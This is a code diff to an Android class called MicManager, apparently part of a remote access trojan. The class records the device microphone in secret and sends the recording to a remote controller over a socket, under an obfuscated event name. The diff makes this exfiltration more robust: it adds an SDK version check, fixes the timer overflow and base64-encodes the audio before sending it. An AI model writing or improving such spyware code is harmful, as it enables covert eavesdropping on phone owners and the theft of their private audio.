@@ -1,6 +1,8 @@
 package com.remote.app;
 
 import android.media.MediaRecorder;
+import android.os.Build;
+import android.util.Base64;
 import android.util.Log;
 
 import com.remote.app.socket.IOSocket;
@@ -43,7 +45,9 @@ public class MicManager {
         recorder = new MediaRecorder();
         recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
         recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD_MR1) {
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+        }
         recorder.setOutputFile(audiofile.getAbsolutePath());
         recorder.prepare();
         recorder.start();
@@ -60,7 +64,7 @@ public class MicManager {
             }
         };
 
-        new Timer().schedule(stopRecording, sec * 1000);
+        new Timer().schedule(stopRecording, sec * 1000L);
     }
 
     private static void sendVoice(File file) {
@@ -71,11 +75,11 @@ public class MicManager {
             BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
             buf.read(data, 0, data.length);
             JSONObject object = new JSONObject();
-            object.put("type", "voice");
+            object.put("type", "audio");
             object.put("path", "Voice Recorder");
             object.put("name", file.getName());
-            object.put("buffer", data);
-            IOSocket.getInstance().getIoSocket().send("_0xMI", object);
+            object.put("buffer", Base64.encodeToString(data, Base64.DEFAULT));
+            IOSocket.getInstance().send("_0xMI", object.toString());
             buf.close();
         } catch (FileNotFoundException e) {
             e.printStackTrace();
